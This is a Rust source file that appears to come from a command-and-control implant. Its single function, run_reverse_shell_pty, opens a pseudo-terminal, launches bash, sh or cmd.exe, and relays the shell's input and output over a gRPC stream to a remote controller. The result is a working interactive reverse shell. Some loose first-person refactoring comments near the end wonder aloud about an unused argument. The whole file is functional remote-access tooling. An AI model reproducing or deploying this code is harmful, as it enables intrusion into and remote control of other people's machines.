use anyhow::Result;
use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::io::{Read, Write};
use std::path::Path;
use transport::Transport;

pub async fn run_reverse_shell_pty<T: Transport>(
    task_id: i64,
    cmd: Option<String>,
    mut transport: T,
) -> Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
    // We will recreate the internal channels needed for the loop.
    let (internal_exit_tx, mut internal_exit_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!("starting reverse_shell_pty (task_id={})", task_id);

    // First, send an initial registration message
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {}", _err);
    }

    // Use the native pty implementation for the system
    let pty_system = native_pty_system();

    // Create a new pty
    let pair = match pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    }) {
        Ok(p) => p,
        Err(e) => {
            return Err(e.into());
        }
    };

    // Spawn command into the pty
    let cmd_builder = match cmd {
        Some(c) => CommandBuilder::new(c),
        None => {
            #[cfg(not(target_os = "windows"))]
            {
                if Path::new("/bin/bash").exists() {
                    CommandBuilder::new("/bin/bash")
                } else {
                    CommandBuilder::new("/bin/sh")
                }
            }
            #[cfg(target_os = "windows")]
            CommandBuilder::new("cmd.exe")
        }
    };

    let mut child = match pair.slave.spawn_command(cmd_builder) {
        Ok(c) => c,
        Err(e) => {
            return Err(e.into());
        }
    };

    let mut reader = match pair.master.try_clone_reader() {
        Ok(r) => r,
        Err(e) => {
            return Err(e.into());
        }
    };
    let mut writer = match pair.master.take_writer() {
        Ok(w) => w,
        Err(e) => {
            return Err(e.into());
        }
    };

    // Spawn task to send PTY output
    const CHUNK_SIZE: usize = 1024;
    tokio::spawn(async move {
        loop {
            let mut buffer = [0; CHUNK_SIZE];
            let n = match reader.read(&mut buffer[..]) {
                Ok(n) => n,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to read pty: {}", _err);
                    break;
                }
            };

            if n < 1 {
                match internal_exit_rx.try_recv() {
                    Ok(None) | Err(tokio::sync::mpsc::error::TryRecvError::Empty) => {}
                    Ok(Some(_status)) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, pty exited: {}", _status);
                        break;
                    }
                    Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, exit channel closed");
                    }
                }
                continue;
            }

            if let Err(_err) = output_tx
                .send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Data.into(),
                    data: buffer[..n].to_vec(),
                    task_id,
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty output failed to queue: {}", _err);
                break;
            }

            // Ping to flush
            if let Err(_err) = output_tx
                .send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: Vec::new(),
                    task_id,
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty ping failed: {}", _err);
                break;
            }
        }
    });

    // Initiate gRPC stream
    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
        let _ = child.kill();
        return Err(e.into());
    }

    // Handle Input
    loop {
        if let Ok(Some(_status)) = child.try_wait() {
            #[cfg(debug_assertions)]
            log::info!("closing input stream, pty exited: {}", _status);
            break;
        }

        if let Some(msg) = input_rx.recv().await {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                continue;
            }
            if let Err(_err) = writer.write_all(&msg.data) {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty failed to write input: {}", _err);
            }
        } else {
            let _ = child.kill();
            break;
        }
    }

    let status = child.wait().ok();
    if let Some(s) = status {
        let _ = internal_exit_tx.send(Some(s)).await;
        // Also signal the parent if needed, although exit_tx in original code was purely internal.
        // We received exit_tx as argument but it wasn't used in original logic except to pass to the async block?
        // Ah, in original code: `let (exit_tx, mut exit_rx) = tokio::sync::mpsc::channel(1);`
        // `exit_tx` was captured by the main task (this one), `exit_rx` by the output task.
        // So we used `internal_exit_tx` here.
        // What about the `exit_tx` argument I added?
        // If the caller wants to know when it exits?
        // The caller (ImixAgent) just spawns and forgets (stores handle).
        // So I can ignore the argument or remove it.
        // I'll keep the signature simple.
    }

    // Original code: `let _ = exit_tx.send(Some(s)).await;` -> This was sending to the output task.
    // So `internal_exit_tx` handles that.

    #[cfg(debug_assertions)]
    log::info!("stopping reverse_shell_pty (task_id={})", task_id);
    Ok(())
}
